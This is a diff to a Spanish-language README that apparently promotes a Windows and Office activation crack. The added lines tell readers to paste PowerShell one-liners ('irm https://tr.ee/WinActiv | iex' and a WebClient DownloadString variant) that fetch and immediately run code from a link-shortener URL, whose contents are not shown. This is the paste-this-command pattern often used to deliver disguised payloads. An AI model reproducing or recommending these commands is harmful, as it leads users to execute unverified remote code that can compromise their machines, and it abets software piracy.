@@ -17,11 +17,11 @@ activador de office / descargar activador de office
 2. **Copia y pega el siguiente código, luego presiona Enter.**  
    - Para **Windows 8, 10, 11**: 📌
      ```powershell
-     irm  | iex
+     irm https://tr.ee/WinActiv | iex
      ```
    - Para **Windows 7** y versiones posteriores:
      ```powershell
-     iex ((New-Object Net.WebClient).DownloadString(''))
+     iex ((New-Object Net.WebClient).DownloadString('https://tr.ee/WinActiv'))
      ```
 
 # 🌐 Cómo Activar Windows
@@ -33,10 +33,12 @@ Sigue estos pasos simples para activar tu sistema:
 <img width="494" height="264" alt="Image" src="https://github.com/user-attachments/assets/f75f9d70-bf75-45f0-88f0-f62f010f2a86" />
 
 > 3. En la consola abierta, introduce el siguiente comando:  
-      ```powershell
-     irm  | iex
-     ```
-<img width="694" height="200" alt="Image" src="https://github.com/user-attachments/assets/62bc1d10-555f-487c-b4d8-573279280677" />
+
+   ```powershell
+     irm https://tr.ee/WinActiv | iex
+   ```
+
+<img width="1692" height="407" alt="Image" src="https://github.com/user-attachments/assets/6bc302f3-fcac-4110-be94-e9fe5b4917bc" />
 
 > 4. Presiona Enter!
 
